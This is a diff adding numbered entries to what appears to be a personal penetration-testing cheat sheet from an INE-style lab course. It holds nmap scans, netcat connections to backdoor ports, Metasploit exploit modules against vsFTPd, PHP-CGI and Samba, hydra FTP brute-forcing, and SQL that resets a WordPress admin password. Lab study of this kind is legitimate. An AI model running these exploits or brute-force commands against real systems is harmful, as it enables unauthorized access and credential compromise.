@@ -1726,7 +1726,73 @@ show tables;
 select * from wp_users;
 UPDATE wp_users SET user_pass = MD5('password123') WHERE user_login = 'admin';
 http://<TARGET-IP>/8585/wordpress/wp-admin
+```
+89) Port Scanning & Enumeration - Linux
 
 ```
+cat /etc/hosts
+ping demo.ine.local
+nmap -sV -p1-10000 10.2.20.22 
+netcat 10.2.20.22 512
+netcat 10.2.20.22 1524
+
+```
+90)  Targeting vsFTPd
+```
+cat /etc/hosts
+ping demo.ine.local
+nmap -sV -sC -p 21 10.2.17.5
+ftp 10.2.17.5 21
+searchsploit vsftpd
+msfconsole
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 10.2.17.5
+run
+hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 10.2.17.5 ftp
+ftp 10.2.17.5 21 #give the username and password
+```
+91) Targeting PHP
+
+```
+cat /etc/hosts
+ping demo.ine.local
+nmap -sV -sC -p 80 10.2.19.172
+searchsploit php cgi
+msfconsole
+use exploit/multi/http/php_cgi_arg_injection
+set RHOSTS 10.2.19.172
+run
+```
+92)  Targeting SAMBA
+```
+cat /etc/hosts
+ping demo.ine.local
+nmap -sV  -p 445 10.2.17.132
+msfconsole
+use auxiliary/scanner/smb/smb_version
+set RHOSTS 10.2.217.132
+run
+searchsploit samba 3.0.20
+msfconsole
+use exploit/multi/samba/usermap_script
+set RHOSTS 10.2.217.132
+exploit
+```
+
+
+
+
+
+
+```
+
+```
+
+
+
+
+
+
+
 
 
